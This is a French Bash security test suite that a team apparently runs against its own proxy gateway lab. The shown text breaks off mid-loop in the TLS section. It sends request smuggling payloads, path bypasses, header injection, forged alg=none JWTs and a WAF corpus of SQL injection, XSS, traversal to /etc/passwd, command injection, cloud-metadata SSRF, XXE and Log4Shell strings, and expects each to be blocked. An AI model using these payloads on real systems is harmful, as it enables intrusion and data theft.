#!/usr/bin/env bash
# Suite de sécurité de la passerelle (défensive, sur SA propre stack) : contournement de contrôle d'accès, usurpation d'IP,
# injection d'en-têtes, request smuggling, corpus d'évasion WAF + faux positifs, cache, WebSocket, JWT, fuites d'information,
# API Admin, TLS. Verdict PASS/FAIL, code retour = nb d'échecs.
#
#   security.sh seed             certificat TLS de test + routes lab-sec-* via l'API Admin (idempotent)
#   security.sh run [sections]   ex. : run waf,jwt,tls ; sans liste = toutes
#   security.sh                  seed + run
#
# Poste de test et réseaux locaux : un pair en réseau privé est un proxy de confiance par défaut (X-Forwarded-For / X-Real-IP
# acceptés) et les plages privées ne sont pas bannies. La section « trust » le détecte ; les contrôles d'usurpation sont alors
# signalés « ignorés » au lieu d'échouer. Le seed place l'IP du poste (ou LAB_RUNNER_CIDR) dans la liste blanche Sentinel
# des routes lab-sec-* : sans cela les centaines de 403 volontaires feraient bannir le poste en cours de test.
# Variables : LAB_BRUTE=1 active le test de frein anti brute-force sur le login Admin (verrouille le compte de test : stack jetable).
set -u
. /lab/scripts/hosts.sh
EDGE_HOST=${EDGE_HOST:-goproxify-edge}
SIM=${LAB_SIM_CTL:-http://lab-sim:9999}
ROUTES=/lab/scripts/security-routes.json
PASSFILE=/tmp/lab-basic.pass
fail=0; npass=0; nskip=0

ok()   { printf '  \033[32mPASS\033[0m %s\n' "$1"; npass=$((npass+1)); }
ko()   { printf '  \033[31mFAIL\033[0m %s\n' "$1"; fail=$((fail+1)); }
info() { printf '  info  %s\n' "$1"; }
skip() { printf '  skip  %s\n' "$1"; nskip=$((nskip+1)); }
code() { curl -s -o /dev/null -w '%{http_code}' --max-time 20 "$@"; }
u()    { echo "http://lab-sec-$1.lab.test"; }
us()   { echo "https://lab-sec-$1.lab.test"; }
rnd()  { echo "$RANDOM$RANDOM"; }
not200() { # description got : le code ne doit pas être 2xx
  case "$2" in 2*) ko "$1 : accepté ($2)";; *) ok "$1 ($2)";; esac
}
check() { local d=$1 got=$2 x; shift 2; for x in "$@"; do [ "$got" = "$x" ] && { ok "$d ($got)"; return; }; done; ko "$d : obtenu « $got », attendu « $* »"; }
raw() { # host port payload [timeout] -> réponse brute
  exec 3<>"/dev/tcp/$1/$2" || return 1
  printf '%b' "$3" >&3
  timeout "${4:-3}" cat <&3 2>/dev/null; exec 3>&-
}
nresp() { grep -c '^HTTP/1\.[01] ' ; }
first_status() { head -1 | tr -d '\r' | awk '{print $2}'; }
rawE() { raw "$EDGE_HOST" 80 "$@"; }
tlsrun() { echo | timeout 8 openssl s_client -connect "$EDGE_HOST:443" -servername "${SNI:-lab-sec-tls.lab.test}" "$@" 2>&1; }
want() { [ -z "${SECTIONS:-}" ] && return 0; case ",$SECTIONS," in *",$1,"*) return 0;; esac; return 1; }
section() { want "$1" || return 1; echo "== $2 =="; return 0; }

# ------------------------------------------------------------------ seed
runner_ip() { hostname -i 2>/dev/null | awk '{print $1}'; }
seed() {
  . /lab/scripts/auth.sh
  [ -f "$PASSFILE" ] || openssl rand -hex 8 > "$PASSFILE"
  local pass cidr tmp icode have name body c
  pass=$(cat "$PASSFILE"); cidr=${LAB_RUNNER_CIDR:-$(runner_ip)/32}
  echo "Liste blanche Sentinel des routes lab-sec-* : $cidr"
  tmp=$(mktemp -d)
  openssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:P-256 -nodes -days 30 -subj '/CN=*.lab.test' \
    -addext 'subjectAltName=DNS:*.lab.test,DNS:lab.test' -keyout "$tmp/key.pem" -out "$tmp/cert.pem" 2>/dev/null
  icode=$(curl -s -o /tmp/sec-import.out -w '%{http_code}' -X POST "$LAB_ADMIN_URL/api/v1/certs/import" \
    -H "Authorization: Bearer $token" -H 'Content-Type: application/json' \
    -d "$(jq -n --rawfile c "$tmp/cert.pem" --rawfile k "$tmp/key.pem" '{cert_pem:$c,key_pem:$k}')")
  case "$icode" in 2*|409) echo "certificat de test *.lab.test : importé ($icode)";; *) echo "ATTENTION import du certificat : $icode $(head -c 200 /tmp/sec-import.out)";; esac
  rm -rf "$tmp"; sleep 2
  have=$(curl -s -H "Authorization: Bearer $token" "$LAB_ADMIN_URL/api/v1/proxies" | jq -r '.[]? | .name // empty')
  jq -c '.[]' "$ROUTES" | while read -r r; do
    name=$(echo "$r" | jq -r .host)
    if echo "$have" | grep -qx "$name"; then printf '%-34s déjà présent : ignoré\n' "$name"; continue; fi
    body=$(echo "$r" | jq -c --arg c "$cidr" '{config: (.config + {host: .host, type: "http", sentinel_whitelist: [$c]})}' | sed "s/__BASIC_PASS__/$pass/g")
    c=$(curl -s -o /tmp/sseed.out -w '%{http_code}' -X POST "$LAB_ADMIN_URL/api/v1/proxies" \
      -H "Authorization: Bearer $token" -H 'Content-Type: application/json' -d "$body")
    printf '%-34s (%s)\n' "$name" "$c"
    case "$c" in 2*) ;; *) jq -r '(.dry_run.errors // [])[] | "  erreur : " + .' /tmp/sseed.out 2>/dev/null || head -c 300 /tmp/sseed.out; echo ;; esac
  done
  for _ in $(seq 1 40); do [ "$(code "$(u plain)/whoami")" = 200 ] && break; sleep 1; done
  [ "$(code "$(u plain)/whoami")" = 200 ] && echo "lab-sec-plain opérationnelle" || echo "ATTENTION : lab-sec-plain ne répond pas"
}

preflight() {
  [ "$(code "$SIM/ctl/stats")" = 200 ] || { echo "  FAIL lab-sim injoignable ($SIM)"; exit 1; }
  for _ in $(seq 1 30); do [ "$(code "$(u plain)/whoami")" = 200 ] && return; sleep 2; done
  echo "  FAIL lab-sec-plain.lab.test indisponible (security.sh seed fait ?)"; exit 1
}
guard() { # détecte un bannissement du poste de test en cours de run
  [ "$(code "$(u plain)/whoami")" = 200 ] || echo "  WARN  lab-sec-plain ne répond plus 200 : poste de test banni (Sentinel / Fail2Ban) ? Les résultats suivants sont faussés."
}

# ------------------------------------------------------------------ sections
TRUSTED=0
t_trust() { section trust "Poste de test : proxy de confiance ?" || return
  local out real c
  c=$(code -H 'X-Forwarded-For: 203.0.113.9' -H 'X-Real-IP: 203.0.113.9' "$(u plain)/echo")
  out=$(curl -s -H 'X-Forwarded-For: 203.0.113.9' -H 'X-Real-IP: 203.0.113.9' "$(u plain)/echo")
  real=$(echo "$out" | jq -r '.headers["X-Real-Ip"][0] // ""' 2>/dev/null)
  # Un 403 ici prouve aussi la confiance : l'IP annoncée (plage de documentation, filtrée par les profils IP) a remplacé l'IP réelle.
  if [ "$real" = 203.0.113.9 ] || [ "$c" = 403 ]; then TRUSTED=1; info "poste de test traité comme proxy de confiance (IP annoncée reprise, code $c) : réseau privé, comportement par défaut. Les contrôles d'usurpation d'IP sont ignorés."
  else TRUSTED=0; ok "X-Real-IP usurpé non repris (backend voit « $real »)"; fi
}

t_acl() { section acl "Contournement du contrôle d'accès par le chemin (location /api/v1/admin protégée)" || return
  local pass p c; pass=$(cat "$PASSFILE" 2>/dev/null)
  check "référence : accès protégé sans identifiants" "$(code "$(u acl)/api/v1/admin/x")" 401
  [ -n "$pass" ] && check "référence : bons identifiants" "$(code -u "lab:$pass" "$(u acl)/api/v1/admin/x")" 200
  for p in '//api/v1/admin/x' '/./api/v1/admin/x' '/api/./v1/admin/x' '/x/../api/v1/admin/x' '/api/v1/admin/../admin/x' '/api/v1//admin/x' \
           '/api/v1/%61dmin/x' '/api/v1/%41dmin/x' '/API/V1/ADMIN/x' '/api/v1/admin;a=b/x' '/api%2fv1/admin/x' '/api/v1/admin%2e/x' \
           '/api/v1/admin%00/x' '/api/v1/admin%5cx' '/%2e/api/v1/admin/x' '/api/v1/admin%2f..%2fadmin/x' '/api/v1/admin/%2e%2e/admin/x'; do
    c=$(code --path-as-is "$(u acl)$p")
    case "$c" in 200) ko "contournement : « $p » accessible sans identifiants (200)";; *) ok "« $p » non accessible sans identifiants ($c)";; esac
  done
  c=$(code -H 'X-Original-URL: /api/v1/admin/x' -H 'X-Rewrite-URL: /api/v1/admin/x' "$(u acl)/whoami"); info "X-Original-URL / X-Rewrite-URL sur un chemin libre : $c"
  check "méthode inhabituelle sur chemin protégé" "$(code -X PUT "$(u acl)/api/v1/admin/x")" 401
  check "en-tête Authorization vide" "$(code -H 'Authorization: Basic' "$(u acl)/api/v1/admin/x")" 401
  check "identifiants incorrects" "$(code -u lab:faux "$(u acl)/api/v1/admin/x")" 401
}

t_ratelimit() { section ratelimit "Rate-limit : débit et contournement par X-Forwarded-For" || return
  local n i
  n=$(for i in $(seq 1 40); do code "$(u ratelimit)/whoami"; echo; done | grep -c 429)
  [ "$n" -ge 10 ] && ok "40 requêtes en rafale : $n en 429" || ko "rate-limit inefficace : $n/40 en 429"
  sleep 3
  if [ $TRUSTED = 1 ]; then skip "rotation de X-Forwarded-For : ignorée, le poste est un proxy de confiance (la clé suit l'IP annoncée par conception)"
  else
    n=$(for i in $(seq 1 40); do code -H "X-Forwarded-For: 198.51.100.$i" "$(u ratelimit)/whoami"; echo; done | grep -c 429)
    [ "$n" -ge 10 ] && ok "rotation de X-Forwarded-For sans effet : $n/40 en 429" || ko "rate-limit contourné par X-Forwarded-For : $n/40 en 429"
  fi
}

t_inject() { section inject "Injection d'en-têtes, Host forgé, SSRF par la ligne de requête" || return
  local out c h
  out=$(rawE "GET /echo?x=a%0d%0aX-Injected:%201 HTTP/1.1\r\nHost: lab-sec-plain.lab.test\r\nConnection: close\r\n\r\n")
  echo "$out" | grep -qi '^x-injected\|"X-Injected"' && ko "CRLF encodé dans l'URL : en-tête injecté" || ok "CRLF encodé dans l'URL : aucun en-tête injecté"
  out=$(rawE "GET /echo HTTP/1.1\r\nHost: lab-sec-plain.lab.test\r\nX-A: b\r\n X-Injected: 1\r\nConnection: close\r\n\r\n")
  echo "$out" | grep -q '"X-Injected"' && ko "obs-fold : en-tête injecté chez le backend" || ok "obs-fold : pas d'en-tête injecté ($(echo "$out" | first_status))"
  for h in lab-sim:9999 lab-sim localhost 127.0.0.1 169.254.169.254 lab-sec-plain.lab.test.evil.test evil.test '[::1]' ''; do
    c=$(code -H "Host: $h" "http://$EDGE_HOST/ctl/stats"); [ "$c" = 200 ] && ko "Host « $h » : l'API de contrôle est joignable (200)" || ok "Host « $h » refusé ($c)"
  done
  out=$(rawE "GET http://lab-sim:9999/ctl/stats HTTP/1.1\r\nHost: lab-sec-plain.lab.test\r\nConnection: close\r\n\r\n")
  echo "$out" | grep -q '"healthy"' && ko "URI absolue vers le port de contrôle interne : réponse du backend interne (SSRF)" || ok "URI absolue vers le port de contrôle interne : ignorée ($(echo "$out" | first_status))"
  out=$(rawE "GET /ctl/stats HTTP/1.1\r\nHost: lab-sec-plain.lab.test\r\nX-Forwarded-Host: lab-sim:9999\r\nConnection: close\r\n\r\n")
  echo "$out" | grep -q '"healthy"' && ko "X-Forwarded-Host détourne vers le port de contrôle" || ok "X-Forwarded-Host sans effet sur le routage"
  out=$(curl -s -H 'X-Forwarded-Host: evil.test' -H 'X-Forwarded-Proto: gopher' "$(u plain)/echo")
  check "X-Forwarded-Host client non transmis tel quel au backend" "$(echo "$out" | jq -r '.headers["X-Forwarded-Host"][0] // ""')" lab-sec-plain.lab.test ""
  out=$(curl -s -H 'Host: lab-sec-plain.lab.test:80@evil.test' "http://$EDGE_HOST/echo"); info "Host avec userinfo : $(echo "$out" | head -c 80)"
}

smug() { # description payload : au plus une réponse, jamais 2xx pour la requête dissimulée
  local out n
  out=$(rawE "$2")
  n=$(echo "$out" | nresp)
  [ "$n" -le 1 ] && ok "$1 : $n réponse ($(echo "$out" | first_status))" || ko "$1 : $n réponses (requête dissimulée traitée ?)"
}
t_protocol() { section protocol "Smuggling, méthodes, limites et entrées malformées" || return
  local H='Host: lab-sec-plain.lab.test' out c big
  smug "CL.TE" "POST /whoami HTTP/1.1\r\n$H\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /whoami HTTP/1.1\r\n$H\r\n\r\n"
  smug "TE.CL" "POST /whoami HTTP/1.1\r\n$H\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGET /whoami HTTP/1.1\r\n$H\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n"
  smug "TE avec espace avant « : »" "POST /whoami HTTP/1.1\r\n$H\r\nTransfer-Encoding : chunked\r\nContent-Length: 4\r\n\r\n0\r\n\r\nGET /whoami HTTP/1.1\r\n$H\r\n\r\n"
  smug "TE obfusqué (xchunked)" "POST /whoami HTTP/1.1\r\n$H\r\nTransfer-Encoding: xchunked\r\nContent-Length: 4\r\n\r\n0\r\n\r\nGET /whoami HTTP/1.1\r\n$H\r\n\r\n"
  smug "TE avec tabulation" "POST /whoami HTTP/1.1\r\n$H\r\nTransfer-Encoding:\tchunked\r\nContent-Length: 4\r\n\r\n0\r\n\r\nGET /whoami HTTP/1.1\r\n$H\r\n\r\n"
  smug "TE en double" "POST /whoami HTTP/1.1\r\n$H\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\nContent-Length: 4\r\n\r\n0\r\n\r\nGET /whoami HTTP/1.1\r\n$H\r\n\r\n"
  out=$(rawE "POST /whoami HTTP/1.1\r\n$H\r\nContent-Length: 5\r\nContent-Length: 6\r\nConnection: close\r\n\r\n12345")
  check "Content-Length en double et différents" "$(echo "$out" | first_status)" 400
  out=$(rawE "POST /whoami HTTP/1.1\r\n$H\r\nContent-Length: -1\r\nConnection: close\r\n\r\n")
  check "Content-Length négatif" "$(echo "$out" | first_status)" 400
  out=$(rawE "CONNECT lab-sim:9999 HTTP/1.1\r\nHost: lab-sim:9999\r\nConnection: close\r\n\r\n")
  case "$(echo "$out" | first_status)" in 2*) ko "CONNECT accepté : tunnel vers le réseau interne";; *) ok "CONNECT refusé ($(echo "$out" | first_status))";; esac
  out=$(rawE "GET /whoami HTTP/9.9\r\n$H\r\nConnection: close\r\n\r\n"); case "$(echo "$out" | first_status)" in 400|505) ok "version HTTP inconnue ($(echo "$out" | first_status))";; "") ok "version HTTP inconnue : connexion fermée";; *) ko "version HTTP inconnue acceptée ($(echo "$out" | first_status))";; esac
  big=$(head -c 120000 /dev/zero | tr '\0' 'a')
  c=$(code "$(u plain)/$big"); case "$c" in 414|431|400|404) ok "URI de 120 Ko refusée ($c)";; 2*) ko "URI de 120 Ko acceptée";; *) ko "URI de 120 Ko : $c (attendu 414/431/400)";; esac
  c=$(code -H "X-Big: $big" "$(u plain)/whoami"); case "$c" in 431|400) ok "en-tête de 120 Ko refusé ($c)";; *) ko "en-tête de 120 Ko : $c (attendu 431/400)";; esac
  c=$(for i in $(seq 1 600); do printf -- '-H X-H%s:v ' "$i"; done | xargs curl -s -o /dev/null -w '%{http_code}' --max-time 20 "$(u plain)/whoami" 2>/dev/null); info "600 en-têtes : $c"
  c=$(code --path-as-is "$(u plain)/%00"); case "$c" in 5*) ko "octet nul dans le chemin : $c";; *) ok "octet nul dans le chemin ($c)";; esac
  c=$(code --path-as-is "$(u plain)/%ff%fe"); case "$c" in 5*) ko "UTF-8 invalide dans le chemin : $c";; *) ok "UTF-8 invalide dans le chemin ($c)";; esac
  c=$(code -X TRACE "$(u plain)/"); check "TRACE" "$c" 405
  c=$(code -X FOOBAR "$(u plain)/whoami"); info "méthode inconnue FOOBAR : $c"
}

# corpus : description|méthode|url-suffixe|corps|en-têtes supplémentaires (séparés par ;;)
waf_block() { local d=$1 m=$2 path=$3 body=${4:-} hdrs=${5:-} args=() h c IFS_OLD=$IFS
  IFS=';;'; for h in $hdrs; do [ -n "$h" ] && args+=(-H "$h"); done; IFS=$IFS_OLD
  if [ -n "$body" ]; then c=$(code -X "$m" --path-as-is "${args[@]}" --data-binary "$body" "$(u waf)$path"); else c=$(code -X "$m" --path-as-is "${args[@]}" "$(u waf)$path"); fi
  [ "$c" = 403 ] && ok "bloqué : $d" || ko "non bloqué : $d ($c)"; }
waf_pass() { local d=$1 path=$2 body=${3:-} hdrs=${4:-} args=() c
  [ -n "$hdrs" ] && args+=(-H "$hdrs")
  if [ -n "$body" ]; then c=$(code -X POST "${args[@]}" --data-binary "$body" "$(u waf)$path"); else c=$(code "${args[@]}" "$(u waf)$path"); fi
  [ "$c" = 200 ] && ok "faux positif évité : $d" || ko "faux positif : $d ($c)"; }
t_waf() { section waf "WAF : corpus d'attaques et d'évasions (block) + faux positifs" || return
  local J='Content-Type: application/json' F='Content-Type: application/x-www-form-urlencoded'
  waf_block "SQLi OR 1=1" GET "/?id=1%27%20OR%20%271%27%3D%271"
  waf_block "SQLi UNION SELECT (casse mixte)" GET "/?id=1%20UnIoN%20SeLeCt%201,2,3"
  waf_block "SQLi UNION/**/SELECT (commentaire)" GET "/?id=1%20UNION/**/SELECT/**/1,2"
  waf_block "SQLi booléenne avec commentaire" GET "/?id=1%27%20AND%201%3D1--%20-"
  waf_block "SQLi requêtes empilées" GET "/?id=1%3BDROP%20TABLE%20users--"
  waf_block "SQLi temporelle" GET "/?id=1%20AND%20SLEEP(5)"
  waf_block "SQLi dans un corps JSON" POST "/echo" "{\"q\":\"' OR 1=1--\"}" "$J"
  waf_block "SQLi dans un corps formulaire" POST "/echo" "user=admin'--&pw=x" "$F"
  waf_block "SQLi dans un cookie" GET "/" "" "Cookie: sid=1' OR '1'='1"
  waf_block "XSS <script>" GET "/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
  waf_block "XSS <img onerror>" GET "/?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E"
  waf_block "XSS <svg onload>" GET "/?q=%3Csvg%2Fonload%3Dalert(1)%3E"
  waf_block "XSS javascript: dans un paramètre" GET "/?url=javascript:alert(document.cookie)"
  waf_block "XSS dans un corps JSON" POST "/echo" '{"c":"<script>alert(1)</script>"}' "$J"
  waf_block "traversal ../ encodé %2f" GET "/?f=..%2f..%2f..%2fetc%2fpasswd"
  waf_block "traversal ....//" GET "/?f=....//....//....//etc/passwd"
  waf_block "traversal %2e%2e/" GET "/?f=%2e%2e/%2e%2e/etc/passwd"
  waf_block "fichier système en paramètre" GET "/?file=/etc/passwd"
  waf_block "injection de commande ;cat" GET "/?c=%3Bcat%20%2Fetc%2Fpasswd"
  waf_block "injection de commande \$(id)" GET "/?c=%24(id)"
  waf_block "injection de commande ||" GET "/?c=1%20%7C%7C%20id"
  waf_block "SSRF métadonnées cloud" GET "/?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F"
  waf_block "SSRF file://" GET "/?url=file%3A%2F%2F%2Fetc%2Fpasswd"
  waf_block "XXE (entité externe)" POST "/echo" '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY x SYSTEM "file:///etc/passwd">]><a>&x;</a>' "Content-Type: application/xml"
  waf_block "Log4Shell dans un en-tête" GET "/" "" 'User-Agent: ${jndi:ldap://x.test/a}'
  waf_block "Log4Shell obfusqué (lower)" GET "/" "" 'X-Api-Version: ${${lower:j}ndi:${lower:l}dap://x.test/a}'
  waf_block "Log4Shell dans l'URL" GET "/?x=%24%7Bjndi%3Aldap%3A%2F%2Fx.test%2Fa%7D"
  waf_block "SSTI {{7*7}}" GET "/?n=%7B%7B7*7%7D%7D"
  waf_block "SSTI \${7*7}" GET "/?n=%24%7B7*7%7D"
  waf_block "SQLi dans un corps en chunked" POST "/echo" "q=1' OR '1'='1" "Transfer-Encoding: chunked;;$F"
  waf_block "outil d'attaque (User-Agent sqlmap)" GET "/" "" "User-Agent: sqlmap/1.7.2#stable (https://sqlmap.org)"
  c=$(code "$(u waf)/?id=1%2527%2520OR%25201%253D1"); info "SQLi en double encodage %2527 (inoffensif sauf double décodage côté application) : $c"
  waf_pass "apostrophe légitime (O'Brien)" "/?q=O%27Brien"
  waf_pass "phrase contenant select/from" "/?q=select+an+option+from+the+list"
  waf_pass "texte français (union européenne)" "/?q=union+europ%C3%A9enne+et+s%C3%A9lection"
  waf_pass "nom de fichier avec points (report..final.pdf)" "/?f=report..final.pdf"
  waf_pass "JSON avec apostrophe et mot « drop »" "/echo" '{"name":"D'"'"'Artagnan","bio":"drop by anytime"}' "$J"
  waf_pass "formule 1+1=2" "/?q=1%2B1%3D2"
  waf_pass "chemin statique javascript" "/static/javascript/app.js"
  waf_pass "corps de formulaire ordinaire" "/echo" "name=Alice&comment=Bonjour+tout+le+monde" "$F"
}

t_cache() { section cache "Cache : fuite entre utilisateurs et empoisonnement" || return
  local k=$(rnd) a b
  a=$(curl -s -H "Authorization: Bearer tok-$k" "$(u cache)/me?k=$k"); b=$(curl -s "$(u cache)/me?k=$k")
  case "$b" in *"tok-$k"*) ko "cache : réponse d'une requête avec Authorization servie à un anonyme ($b)";; *) ok "requête avec Authorization non resservie à un anonyme ($b)";; esac
  k=$(rnd)
  a=$(curl -s -H "Cookie: sid=alice-$k" "$(u cache)/me?k=$k")
  b=$(curl -s "$(u cache)/me?k=$k")
  case "$b" in *"alice-$k"*) ko "cache deception : la réponse personnalisée d'un utilisateur est servie à un anonyme ($b)";; *) ok "réponse personnalisée non servie à un anonyme ($b)";; esac
  k=$(rnd); curl -s -o /dev/null -H "Cookie: sid=bob-$k" "$(u cache)/me?k=$k"; a=$(curl -s -H "Cookie: sid=carol-$k" "$(u cache)/me?k=$k")
  case "$a" in *"bob-$k"*) ko "cache : la réponse de bob est servie à carol";; *) ok "réponses de deux utilisateurs distincts non mélangées ($a)";; esac
  k=$(rnd); curl -s -o /dev/null -H 'X-Forwarded-Host: evil.test' "$(u cache)/reflect?k=$k"; b=$(curl -s "$(u cache)/reflect?k=$k")
  case "$b" in *evil.test*) ko "empoisonnement : X-Forwarded-Host client servi aux autres ($b)";; *) ok "pas d'empoisonnement par X-Forwarded-Host ($b)";; esac
}

ws_hs() { # origin -> sortie brute
  exec 3<>"/dev/tcp/$EDGE_HOST/80" || return 1
  printf 'GET /ws HTTP/1.1\r\nHost: lab-sec-ws.lab.test\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\nOrigin: %s\r\n\r\n' "$1" >&3
  timeout 2 cat <&3 | cat -v | head -3; exec 3>&-
}
t_ws() { section ws "WebSocket : origine (détournement entre sites)" || return
  case "$(ws_hs https://app.lab.test)" in *"101 "*) ok "origine autorisée : upgrade 101";; *) ko "origine autorisée refusée";; esac
  case "$(ws_hs https://evil.test)" in *"101 "*) ko "origine https://evil.test acceptée alors que cors.allowed_origins la limite à app.lab.test";; *) ok "origine étrangère refusée";; esac
  case "$(ws_hs null)" in *"101 "*) ko "origine « null » acceptée";; *) ok "origine « null » refusée";; esac
}

jwt() { curl -s "$SIM/ctl/jwt?$1"; }
t_jwt() { section jwt "JWT : jetons valides, forgés, expirés, confusion d'algorithme" || return
  local t c b
  t=$(jwt ""); check "jeton valide (RS256)" "$(code -H "Authorization: Bearer $t" "$(u jwt)/whoami")" 200
  check "header_name=Authorization (jeton valide) : le préfixe « Bearer » doit être retiré" "$(code -H "Authorization: Bearer $t" "$(u jwt-authz)/whoami")" 200
  check "aucun jeton" "$(code "$(u jwt)/whoami")" 401
  check "jeton alg=none" "$(code -H "Authorization: Bearer $(jwt 'alg=none')" "$(u jwt)/whoami")" 401
  check "confusion RS/HS (HS256 signé avec la clé publique)" "$(code -H "Authorization: Bearer $(jwt 'alg=HS256')" "$(u jwt)/whoami")" 401
  check "charge utile modifiée (signature invalide)" "$(code -H "Authorization: Bearer $(jwt 'tamper=1')" "$(u jwt)/whoami")" 401
  check "jeton expiré" "$(code -H "Authorization: Bearer $(jwt 'exp=-120')" "$(u jwt)/whoami")" 401
  check "mauvais émetteur (iss)" "$(code -H "Authorization: Bearer $(jwt 'iss=https://evil.test')" "$(u jwt)/whoami")" 401
  check "mauvaise audience (aud)" "$(code -H "Authorization: Bearer $(jwt 'aud=autre-api')" "$(u jwt)/whoami")" 401
  check "jeton illisible" "$(code -H 'Authorization: Bearer abc.def.ghi' "$(u jwt)/whoami")" 401
  check "« Bearer » sans jeton" "$(code -H 'Authorization: Bearer ' "$(u jwt)/whoami")" 401
  check "schéma Basic au lieu de Bearer" "$(code -H 'Authorization: Basic YWRtaW46YWRtaW4=' "$(u jwt)/whoami")" 401
  b=$(curl -s -H "Authorization: Bearer $t" -H 'X-Claims: {"sub":"admin","role":"root"}' "$(u jwt)/echo")
  case "$(echo "$b" | jq -r '.headers["X-Claims"][0] // ""')" in *root*|*admin*) ko "X-Claims forgé par le client transmis au backend";; *) ok "X-Claims forgé par le client écrasé ou retiré ($(echo "$b" | jq -r '.headers["X-Claims"][0] // "absent"' | head -c 60))";; esac
}

t_errleak() { section errleak "Fuites d'information (pages d'erreur, en-têtes)" || return
  local h body
  h=$(mktemp); body=$(curl -s -D "$h" "$(u errleak)/")
  check "backend injoignable → 502" "$(head -1 "$h" | awk '{print $2}')" 502
  echo "$body" | grep -qiE 'lab-sim|9009|connection refused|dial tcp|goroutine|panic|\.go:[0-9]+|172\.[0-9]+\.[0-9]+\.[0-9]+' && ko "page d'erreur : détails internes exposés ($(echo "$body" | head -c 100))" || ok "page d'erreur sans adresse, port ni trace internes"
  grep -qiE '^server: *go|^x-powered-by' "$h" && ko "en-tête révélateur sur la page d'erreur ($(grep -iE '^server|^x-powered' "$h" | head -1))" || ok "pas d'en-tête révélateur sur la page d'erreur"
  body=$(curl -s -H 'Host: inconnu.lab.test' "http://$EDGE_HOST/"); echo "$body" | grep -qiE 'lab-sim|172.[0-9]+.[0-9]+.[0-9]+' && ko "page d'hôte inconnu : adresse interne exposée" || ok "page d'hôte inconnu sans adresse de backend"
  echo "$body" | grep -qiE 'goproxify-admin|component=edge' && info "la page d'hôte inconnu contient un lien vers l'Admin (GPX_ADMIN_PUBLIC_URL ; à vider pour ne pas l'exposer, voir rapport 2026-09-24)"
  rm -f "$h"
}

t_admin() { section admin "API Admin : accès sans jeton, jetons invalides, injection" || return
  local ep c forged b
  [ -n "${LAB_ADMIN_URL:-}" ] || { skip "LAB_ADMIN_URL absent"; return; }
  for ep in proxies users certs nodes settings tokens security/bans; do
    c=$(curl -s -o /tmp/adm.body -w "%{http_code}" "$LAB_ADMIN_URL/api/v1/$ep"); case "$c:$(head -c1 /tmp/adm.body)" in 2*:{|2*:[) ko "/api/v1/$ep renvoie des données sans jeton ($c)";; *) ok "/api/v1/$ep : aucune donnée sans jeton ($c)";; esac
  done
  check "jeton Bearer invalide" "$(code -H 'Authorization: Bearer garbage' "$LAB_ADMIN_URL/api/v1/proxies")" 401
  forged="$(printf '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_').$(printf '{"sub":"1","role":"superadmin","exp":9999999999}' | base64 | tr -d '=' | tr '+/' '-_')."
  check "JWT alg=none se faisant passer pour superadmin" "$(code -H "Authorization: Bearer $forged" "$LAB_ADMIN_URL/api/v1/proxies")" 401
  check "jeton avec un préfixe de PAT inventé" "$(code -H 'Authorization: Bearer gpx_pat_0000000000000000' "$LAB_ADMIN_URL/api/v1/proxies")" 401
  c=$(code --path-as-is "$LAB_ADMIN_URL/api/v1/../v1/proxies"); not200 "traversal d'API sans jeton" "$c"
  c=$(code -X POST -H 'Content-Type: application/json' -d "{\"email\":\"admin' OR '1'='1\",\"password\":\"x\"}" "$LAB_ADMIN_URL/api/v1/auth/login"); case "$c" in 5*|2*) ko "injection SQL sur le login : $c";; *) ok "injection SQL sur le login rejetée ($c)";; esac
  c=$(code -X POST -H 'Content-Type: application/json' -d '{"email":["a"],"password":{"$ne":1}}' "$LAB_ADMIN_URL/api/v1/auth/login"); case "$c" in 5*|2*) ko "login avec types inattendus : $c";; *) ok "login avec types inattendus rejeté ($c)";; esac
  b=$(curl -s -D- -o /dev/null "$LAB_ADMIN_URL/api/v1/health" | tr -d '\r'); echo "$b" | grep -qi '^x-content-type-options: nosniff' && ok "X-Content-Type-Options: nosniff sur l'API" || info "X-Content-Type-Options absent sur /api/v1/health"
  if [ "${LAB_BRUTE:-0}" = 1 ]; then
    c=$(for i in $(seq 1 25); do code -X POST -H 'Content-Type: application/json' -d "{\"email\":\"inexistant@lab.test\",\"password\":\"mdp$i\"}" "$LAB_ADMIN_URL/api/v1/auth/login"; echo; done | grep -cE '^(429|423)$')
    [ "$c" -ge 1 ] && ok "frein anti brute-force : $c refus 429/423 sur 25 essais" || ko "aucun frein anti brute-force sur 25 essais de login"
  else skip "brute-force du login : LAB_BRUTE=1 pour l'activer (verrouille le compte de test)"; fi
}

t_tls() { section tls "TLS : protocoles, suites, certificat, HTTP/2, cookies, SNI" || return
  local out hdr jar cn sig bits
  check "HTTPS (certificat auto-signé de test)" "$(code -k "$(us tls)/whoami")" 200
  out=$(tlsrun -tls1_3); case "$out" in *"TLSv1.3"*"Cipher is"*|*"Protocol  : TLSv1.3"*|*"Protocol: TLSv1.3"*) ok "TLS 1.3 accepté";; *) ko "TLS 1.3 non négocié";; esac
  out=$(tlsrun -tls1_2); case "$out" in *"Protocol  : TLSv1.2"*|*"Protocol: TLSv1.2"*) info "TLS 1.2 accepté";; *) info "TLS 1.2 refusé";; esac
  for p in tls1 tls1_1; do
    out=$(SNI= tlsrun -$p -cipher 'ALL:@SECLEVEL=0' 2>&1)
    case "$out" in
      *"no protocols available"*|*"unknown option"*|*"unsupported protocol"*|*"Unrecognized option"*) skip "$p : non testable depuis ce client OpenSSL";;
      *"Cipher is (NONE)"*|*"handshake failure"*|*"alert protocol version"*|*"wrong version number"*|*"no peer certificate"*) ok "$p refusé";;
      *"Protocol  : TLSv1"*|*"Protocol: TLSv1"*) ko "$p accepté (protocole obsolète)";;
      *) ok "$p refusé (aucune session établie)";;
    esac
  done
  for c in 'RC4' '3DES:DES' 'EXPORT' 'NULL:eNULL:aNULL'; do
    out=$(tlsrun -tls1_2 -cipher "$c:@SECLEVEL=0" 2>&1)
